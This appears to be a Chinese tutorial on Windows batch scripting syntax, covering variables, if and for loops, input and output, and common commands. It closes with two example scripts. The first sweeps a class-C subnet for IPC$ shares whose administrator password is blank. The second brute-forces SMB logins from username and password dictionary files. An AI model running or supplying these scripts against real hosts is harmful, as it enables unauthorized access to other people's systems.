### 注释
```bat
REM 单行注释
```

### 变量的定义与使用
```bat
REM 定义
set var=value
set /a sum=2+3  # /a 实现数学运算
set /p name=Please enter name:   # /p 实现输入input功能
REM 使用
%var%
%0  # 变量用于获取当前批处理文件的名称
%~dp0  # 变量用于获取当前批处理文件的目录
```
### 流程控制
```bat
REM 分支
if...elseif...else
set age=20
if %age% geq 18 (
    echo You are an adult
) else (
    echo You are still a child
)
if exist 命令用于测试文件或目录是否存在
if defined 命令用于测试变量是否已经定义
if errorlevel 命令用于测试前一个命令的退出代码

REM 循环
for %%i in (1 2 3) do echo %%i  # 遍历列表
for /f "delims=" %%i in (file.txt) do echo %%i  # 遍历文件中的内容
for /r c:\windows %%i in (*.dll) do echo %%i  # 命令递归遍历所有的子目录
forfiles /p c:\ /s /m *.txt /c "cmd /c echo @file"  # 在c:\ 目录及其所有子目录中查找并输出所有的.txt文件

REM for命令及变量 基本格式： 
FOR ①/参数 ②%variable ③IN (set) DO ④command [⑤command_parameters] 
①参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，
如(d:\pass.txt)时 }。 

②%variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。
批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；
例：net use \\ip\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3

③IN (set)：指在(set)中取值；(set):指定一个或一组文件，可使用通配符，
如：(D:\user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”
第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，
即：从1到254；“(1 -1 254)”说明：即从254到1 }

④DO command ：指执行command,指定对第个文件执行的命令，
如：net use命令；如要执行多个命令时，命令这间加：& 来隔开

⑤command_parameters：为特定命令指定参数或命令行开关
```
### IO交互
```vb
REM 输入
set /p name=Please enter you name:
choice /c ync /m "Do you want to continue (y/n/c)?"  # 实现用户的输入选择操作
choice /t 10 /c /yn /d y /m "Do you want to proceed?"  # 将选择操作的等待时间设置为指定的秒数

REM 输出
echo :  # 打印输出
type *.txt > output.txt  # 合并文件并输出内容，文件重定向用于将输出内容保存到文件中
```
### 常用命令
```vb
echo  # 打印输出
@echo on  # 开启回显
@echo off  # 关闭回显
start  # 在另一个窗口中启动批处理
start notepad.exe  # 可以启动新窗口并执行命令
call other.bat  # 调用另一个批处理文件
shift  # 可以将命令参数转移
     set param1=%1
     shift
     set param2=%1  # 由此可以将第一个和第二个命令参数分别赋值给param1和param2
timeout /t 5  # 5秒后终止批处理
color 0a  # 设置控制台颜色，第一位是背景颜色，第二位是前景颜色
setlocal  # 在批处理文件中开启局部作用域，将变量的作用域限定在当前脚本中，而不是对整个系统造成影响
     set name=John
     echo %name%
endlocal  # 关闭局部作用域
pushd c:\  # 用于将当前目录压入堆栈，并进入指定的目录
     dir
popd  # 用于从堆栈中弹出最后一个目录，并返回该目录
findstr /c:"error" log.txt  # 在指定文件或字符串中查找匹配的文本
type *.txt > output.txt  # 合并文件并输出内容，文件重定向用于将输出内容保存到文件中
```
### 代码案例1
```
@echo off 
echo 用法格式：test.bat *.*.* > test.txt 

for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \\%1.%%G /user:***istrator | find "命令成功完成" >>test.txt 

REM
存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立***istrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。

/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；
%%G 为变量(ip的最后一位）；
& 用来隔开echo 和net use 这二个命令；
| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；
%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 
```
### 代码案例2
```
@echo off 
echo 用法格式：ok.bat ip 
FOR /F %%i IN (D:\user.dic) DO smb.exe %1 %%i D:\pass.dic 200 
REM
存为：ok.exe 说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。
%%i为用户名；%1为输入的IP地址（默认）。
```
